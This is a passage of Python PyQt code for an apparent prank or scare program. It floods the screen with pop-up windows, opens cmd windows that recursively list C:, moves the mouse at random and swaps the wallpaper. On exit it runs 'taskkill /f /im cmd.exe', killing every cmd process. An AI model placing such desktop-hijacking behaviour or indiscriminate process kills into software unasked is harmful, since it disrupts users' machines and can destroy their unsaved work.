+712 -   58: 
+713 -   59:     janelaPop.destroyed.connect(
+714 -   60:         lambda: janelas.remove(janelaPop) if janelaPop in janelas else None
+715 -   61:     )
+716 -   62: 
+717 -   63: 
+718 -   64: def criar_moedas():
+719 -   65:     janelaMoeda = JanelaMoeda()
+720 -   66:     # mover_mouse_aleatorio()
+721 -   67:     janelasCascadaCara(
+722 -   68:         x=random.randint(0, Globais.largura - 300),
+723 -   69:         y=random.randint(0, Globais.altura - 300),
+724 -   70:     )
+725 -   71: 
+726 -   72:     # Guarda a referência para a janela não ser destruída
+727 -   73:     moedas.append(janelaMoeda)
+728 -   74: 
+729 -   75:     janelaMoeda.destroyed.connect(
+730 -   76:         lambda: moedas.remove(janelaMoeda) if janelaMoeda in moedas else None
+731 -   77:     )
+732 -   78: 
+733 -   79:     Globais.janela.raise_()
+734 -   80: 
+735 -   81: 
+736 -   82: def criar_caras():
+737 -   83:     janelaCara1 = JanelaCara()
+738 -   84:     janelaCara2 = JanelaCara()
+739 -   85:     janelaCara3 = JanelaCara()
+740 -   86: 
+741 -   87:     janelasCascadaCara(
+742 -   88:         x=random.randint(0, Globais.largura - 300),
+743 -   89:         y=random.randint(0, Globais.altura - 300),
+744 -   90:         quantidade=5,
+745 -   91:         tempo=100,
+746 -   92:         distancia=50,
+747 -   93:         imagem=random.choice(list(BG.Caras)).value,
+748 -   94:     )
+749 -   95: 
+750 -   96:     # Guarda a referência para a janela não ser destruída
+751 -   97:     caras.append(janelaCara1)
+752 -   98:     caras.append(janelaCara2)
+753 -   99:     caras.append(janelaCara3)
+754 -  100: 
+755 -  101:     janelaCara1.destroyed.connect(
+756 -  102:         lambda: caras.remove(janelaCara1) if janelaCara1 in caras else None
+757 -  103:     )
+758 -  104:     janelaCara2.destroyed.connect(
+759 -  105:         lambda: caras.remove(janelaCara2) if janelaCara2 in caras else None
+760 -  106:     )
+761 -  107:     janelaCara2.destroyed.connect(
+762 -  108:         lambda: caras.remove(janelaCara2) if janelaCara2 in caras else None
+763 -  109:     )
+764 -  110: 
+765 -  111:     proximo_tempo = random.randint(300, 700)
+766 -  112:     timer4.start(proximo_tempo)
+767 -  113:     Globais.janela.raise_()
+768 -  114: 
+769 -  115: 
+770 -  116: def abrir_cmd():
+771 -  117:     n1 = random.randint(1, 5)
+772 -  118:     n1 = 4
+773 -  119: 
+774 -  120:     os.system(f'start cmd /k "color {n1} && cd /d c:\\ && dir /s"')
+775 -  121: 
+776 -  122: 
+777 -  123: def fechar_todas():
+778 -  124:     global janela, listener
+779 -  125: 
+780 -  126:     # Parar os timers
+781 -  127:     for t in (timer, timer2, timer3, timer4, timer5, timer6):
+782 -  128:         if t is not None:
+783 -  129:             t.stop()
+784 -  130: 
+785 -  131:     # Parar o listener do mouse, se existir
+786 -  132:     if listener is not None:
+787 -  133:         listener.stop()
+788 -  134: 
+789 -  135:     # Fechar as janelas das listas
+790 -  136:     for janela_atual in list(janelas + caras + moedas):
+791 -  137:         if janela_atual is not None and isValid(janela_atual):
+792 -  138:             janela_atual.close()
+793 -  139:             janela_atual.deleteLater()
+794 -  140: 
+795 -  141:     janelas.clear()
+796 -  142:     caras.clear()
+797 -  143:     moedas.clear()
+798 -  144: 
+799 -  145:     # Fechar a janela principal
+800 -  146:     Globais.janela.close()
+801 -  147:     Globais.janela.deleteLater()
+802 -  148: 
+803 -  149:     # Fechar os CMDs criados pelo programa
+804 -  150:     os.system("taskkill /f /im cmd.exe")
+805 -  151: 
+806 -  152:     restaurar_wallpaper(wallpaper_original)
+807 -  153:     parar_som("fundo")
+808 -  154: 
+809 -  155:     # Criar a janela final somente depois de fechar tudo
+810 -  156:     janela = JanelaThank()
+811 -  157:     janela.show()
+812 -  158:     janela.raise_()
+813 -  159:     janela.activateWindow()
+814 -  160: 
+815 -  161:     janelas.append(janela)
+816 -  162: 
+817 -  163:     janela.destroyed.connect(
+818 -  164:         lambda: janelas.remove(janela) if janela in janelas else None
+819 -  165:     )
+820 -  166: 
+821 -  167:     tocar_som("ganhou")
+822 -  168: 
+823 -  169: 
+824 -  170: def verificar_moedas():
+825 -  171:     if Globais.Moedas <= 0:
+826 -  172:         fechar_todas()
+827 -  173: 
+828 -  174: 
+829 -  175: def iniciar_video():
+830 -  176:     global video, mexeu, listener
+831 -  177: 
+832 -  178:     if mexeu:
+833 -  179: 
+834 -  180:         video = JanelaVideo(BG.caminho_recurso(r"videos\\Video Project 1.mp4"))
+835 -  181:         video.terminou.connect(iniciar_jogo)
+836 -  182:         video.show()
+837 -  183: 
+838 -  184:     else:
+839 -  185:         listener.stop()
+840 -  186:         listener = None
+841 -  187:         num = random.randint(1000 * 10, 1000 * 60)
+842 -  188:         num = 1000
+843 -  189:         QTimer.singleShot(num, testar_mexeu)
+844 -  190: 
+845 -  191: 
+846 -  192: def iniciar_jogo():
+847 -  193:     global janela, timer, timer2, timer3, timer4, timer5, timer6
+848 -  194: 
+849 -  195:     timer = QTimer(Globais.janela)
+850 -  196:     timer2 = QTimer(Globais.janela)
+851 -  197:     timer3 = QTimer(Globais.janela)
+852 -  198:     timer4 = QTimer(Globais.janela)
+853 -  199:     timer5 = QTimer(Globais.janela)
+854 -  200:     timer6 = QTimer(Globais.janela)
+855 -  201: 
+856 -  202:     tocar_som("fundo")
+857 -  203: 
+858 -  204:     Globais.janela = JanelaMain()
+859 -  205:     Globais.janela.show()
+860 -  206: 
+861 -  207:     timer.timeout.connect(abrir_janela)
+862 -  208:     timer.start(1000)  # 1000 ms = 1 segundo
+863 -  209: 
+864 -  210:     timer2.timeout.connect(abrir_cmd)
+865 -  211:     timer2.start(10000)  # 1000 ms = 1 segundo
+866 -  212: 
+867 -  213:     timer3.timeout.connect(criar_moedas)
+868 -  214:     timer3.start(2000)  # 1000 ms = 1 segundo
+869 -  215: 
+870 -  216:     timer4.timeout.connect(criar_caras)
+871 -  217:     timer4.start(random.randint(300, 700))  # 1000 ms = 1 segundo
+872 -  218: 
+873 -  219:     timer5.timeout.connect(verificar_moedas)
+874 -  220:     timer5.start(100)  # 1000 ms = 1 segundo
+875 -  221: 
+876 -  222:     timer6.timeout.connect(mover_mouse_aleatorio)
+877 -  223:     timer6.start(5000)  # 1000 ms = 1 segundo
+878 -  224: 
+879 -  225:     mudar_wallpaper(
+880 -  226:         BG.caminho_recurso(r"imagens\\Captura de tela 2026-09-09 194707.png")
+881 -  227:     )
+882 -  228: 
+883 -  229: 
+884 -  230: # principal = QWidget()
+885 -  231: # principal.setWindowTitle("Controle da réplica")
+886 -  232: 
+887 -  233: # layout = QVBoxLayout(principal)
+888 -  234: 
+889 -  235: # botao_abrir = QPushButton("Abrir janela")
+890 -  236: # botao_abrir.clicked.connect(abrir_janela)
+891 -  237: 
+892 -  238: # botao_fechar = QPushButton("Fechar todas")
+893 -  239: # botao_fechar.clicked.connect(fechar_todas)
+894 -  240: 
+895 -  241: # layout.addWidget(botao_abrir)
+896 -  242: # layout.addWidget(botao_fechar)
+897 -  243: 
+898 -  244: 
+899 -  245: # principal.show()
+900 -  246: def chamar_iniciar_video(x, y):
+901 -  247:     global mexeu
+902 -  248: 
+903 -  249:     if not mexeu:
+904 -  250:         mexeu = True
+905 -  251:         # QTimer.singleShot(0, iniciar_video)
+906 -  252: 
+907 -  253: 
+908 -  254: def testar_mexeu():
+909 -  255:     global video, listener
+910 -  256:     janela = JanelaCara(Caras.img1.value, tempo=1000)
+911 -  257:     janelas.append(janela)
+912 -  258: 
+913 -  259:     janela.destroyed.connect(
+914 -  260:         lambda: janelas.remove(janela) if janela in janelas else None
+915 -  261:     )
+916 -  262:     tocar_som("comeca")
+917 -  263: 
+918 -  264:     def trocar_video():
+919 -  265:         global video, listener
+920 -  266:         video = JanelaVideo(BG.caminho_recurso("videos\\Video Project 7.mp4"))
+921 -  267:         video.terminou.connect(iniciar_video)
+922 -  268:         video.show()
+923 -  269: 
+924 -  270:         listener = mouse.Listener(on_move=chamar_iniciar_video)
+925 -  271:         listener.start()
+926 -  272: 
+927 -  273:     # timeV = QTimer()
+928 -  274:     # timeV.timeout.connect(trocar_video)
+929 -  275: 
+930 -  276:     QTimer.singleShot(900, trocar_video)
+931 -  277: 
+932 -  278: 
+933 -  279: carregar_sons()
+934 -  280: testar_mexeu()
+935 -  281: 
+936 -  282: sys.exit(app.exec())
+
+
